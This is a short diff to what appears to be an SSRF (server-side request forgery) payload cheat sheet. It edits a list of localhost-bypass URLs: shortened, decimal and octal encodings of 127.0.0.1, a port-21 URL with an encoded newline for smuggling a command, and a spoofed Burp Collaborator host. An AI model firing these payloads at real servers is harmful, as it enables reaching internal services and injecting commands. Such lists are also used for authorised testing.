@@ -25,7 +25,7 @@ _____________________________________
 http://127.1
 http://2130706433
 http://017700000001
-http://127.0.0.1:21/?%0A
+http://127.0.0.1:21/?%0A >> You can change port number if needed.
 http://spoofed.burpcollaborator.net
 ```
 ### SSRF with whitelist-based input filters
